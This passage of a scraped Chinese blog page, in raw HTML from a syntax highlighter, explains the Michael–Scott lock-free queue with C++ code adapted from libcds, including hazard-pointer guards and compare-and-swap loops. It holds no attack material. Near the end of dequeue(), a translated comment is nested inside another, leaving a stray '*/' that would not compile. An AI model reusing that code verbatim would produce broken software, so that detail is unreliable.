&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0ce677475022-27&quot;&gt;27&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0ce677475022-1&quot;&gt;
&lt;span class=&quot;crayon-t&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0ce677475022-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;pNext&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0ce677475022-3&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0ce677475022-4&quot;&gt;
&lt;span class=&quot;crayon-t&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;queue&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0ce677475022-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;pHead&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0ce677475022-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;pTail&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0ce677475022-7&quot;&gt;
&lt;span class=&quot;crayon-m&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0ce677475022-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;queue&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;m_pHead&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;m_pTail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0ce677475022-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;enqueue&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0ce677475022-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0ce677475022-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pNext&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0ce677475022-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;pTail&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0ce677475022-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pTail&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pNext&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0ce677475022-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;else&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0ce677475022-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pHead&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0ce677475022-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pTail&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0ce677475022-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0ce677475022-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;dequeue&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0ce677475022-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0ce677475022-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;pHead&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0ce677475022-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;pHead&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0ce677475022-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pHead&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;pNext&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0ce677475022-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;pHead&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0ce677475022-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pTail&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0ce677475022-25&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0ce677475022-26&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0ce677475022-27&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0047 seconds] --&gt;
&lt;p&gt;这里就不要过多纠结于此，它不适用于并发，列出来只是为了印证主题，说明该队列有多简单。本文会向大家展示，该队列适用于并发场景时，其简单算法做了哪些变动。&lt;/p&gt;
&lt;p&gt;Michael和Scott的算法被认为是无锁队列的经典算法。&lt;/p&gt;
&lt;p&gt;以下代码来自libcds库，它是经典算法的一种简单实现。若想查看全部代码，请看cds::intrusive::MSQueue类。代码中包含有注释，避免大家读起来乏味：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9f471b0d8439235974&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
bool enqueue( value_type&amp;amp;amp; val )
{
    /*
         实现细节：NODE_TYPE和VALUE_TYPE-
        是不一样的，因此需要类型转换。
       为了简单起见，我们假定node_traits :: to_node_ptr -
      仅仅是的static_cast&amp;amp;lt;node_type *&amp;amp;gt;( &amp;amp;amp;val )
   */

      node_type * pNew = node_traits::to_node_ptr( val )  ;
      typename gc::Guard guard; // A guard, for example, Hazard Pointer
      // Back-off strategy (of the template-argument class)
      back_off bkoff;
      node_type * t;
       // As always in lock-free, we’ll deal with it, till we make the right thing...
       while ( true ) {
          /*
            保护m_pTail, 在读取该字段时
          可以规避已删除内存被读的情形
          */
           t = guard.protect( m_pTail, node_to_value() );
           node_type * pNext = t-&amp;amp;gt;m_pNext.load(
                    memory_model::memory_order_acquire);
          /*
            有趣的是：该算法假定
            m_pTail不能指向尾部（Tail），
            而是希望通过进一步的调用实现对Tail正确的设置。
            多线程互助就是一个典型的例子
            */
           if ( pNext != nullptr ) {
               // 在接下来的线程之后
                // 有必要有效地清理Tail
                m_pTail.compare_exchange_weak( t, pNext,
                       std::memory_order_release, std::memory_order_relaxed);
                /*
                  全部必须从新开始，即使CAS不成功；
                  CAS不成功的，意味着在我们读取m_pTail之前，它已经被改变
                  */
                continue    ;
           }
          node_type * tmp = nullptr;
          if ( t-&amp;amp;gt;m_pNext.compare_exchange_strong( tmp, pNew,
                                std::memory_order_release,
                                std::memory_order_relaxed ))
          {
        // Have successfully added a new element to the queue.
                    break    ;
          }
         /*
          执行失败- 即CAS运算没有成功
          这意味着有人先我们到达
          检测到有并发，为了不恶化CAS
          调用back_off函数
          我们及时地做一个短时间的回退
          */
          bkoff();
     }
      /*
       通常，我们可以利用元素计数器
      显而易见，此计数器是不很准确：
      元素早已添加，我们现在的才进行计数
      这样的计数器只能作为元素数量的清单，
      不能作为一个空队列符号
      */
    ++m_ItemCounter    ;
    /*
      最后，试着改变m_pTail的Tail。
      不用在意成功与否，
      如果没有成功，
      它们会在dequeue()方法的Oops!注解前后被清理掉
      */
     m_pTail.compare_exchange_strong( t, pNew,
               std::memory_order_acq_rel, std::memory_order_relaxed );
     /*
    本算法返回必然是true。
    其它算法，比如有界队列，
    当队列已满时，可以返回false
    为了保证接口的一致性，enqueue()
    总是返回成功的标志
    */
     return true;      
}
value_type * dequeue()
{
     node_type * pNext;
     back_off bkoff;
    // We need 2 Hazard Pointers for dequeue 
     typename gc::template GuardArray&amp;amp;lt;2&amp;amp;gt;  guards;
      node_type * h;
      // Keep trying till we can execute it…
      while ( true ) {
           // Read and guard our Head m_pHead
           h = guards.protect( 0, m_pHead, node_to_value() );
           // and the element that follows the Head
           pNext = guards.protect( 1, h-&amp;amp;gt;m_pNext, node_to_value() );
           // Check: is what we have just read 
           // remains bounded?..
           if ( m_pHead.load(std::memory_order_relaxed) != h ) {
                // no, - someone has managed to spoil everything... 
                // Start all over again
                continue;
           }
          /*
            此标记显示队列已空
            注意与tail不同的是，
            H=head始终不会错的
            */
           if ( pNext == nullptr )
                 return nullptr;    // the queue is empty
           /*
            此处读取tail，但未采用Hazard Pointer对其进行保护
            我们对其指向的上下文（数据结构中字段）不感兴趣
            */
           node_type * t = m_pTail.load(std::memory_order_acquire);
           if ( h == t ) {
                /*
                  糟糕，有头无尾
                  元素紧随头之后，
                  并且尾指向头。
                  我想到了应该纠错的时候了
                  */
               m_pTail.compare_exchange_strong( t, pNext,
                        std::memory_order_release, std::memory_order_relaxed);
               // After helping them, we have to start over. 
               // Therefore, the CAS result is not important for us
               continue;
           }
           // The most important thing is to link a new Head
           // That is, we move down the list
           if ( m_pHead.compare_exchange_strong( h, pNext, 
                     std::memory_order_release, std::memory_order_relaxed ))
           {
                    // Success! Terminate our infinite loop
                    break;
           }
           /*
            倘若失败，意味着有其干预；
            不干扰它们，退回去小歇片刻
            */
           bkoff()    ;
     }
    // Change the not very useful counter of elements, 
    // see the comment in enqueue
     --m_ItemCounter;
     // It’s the call of &#39;remove the h element&#39; functor
     dispose_node( h );
     /* 
   /*
   有趣的是，
   返回[ex] Head后面的元素，
   但pNext仍然在队列中-
   这是队列的新头部！
  */
     */
     return pNext;
}&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-3&quot;&gt;3&lt;/div&gt;
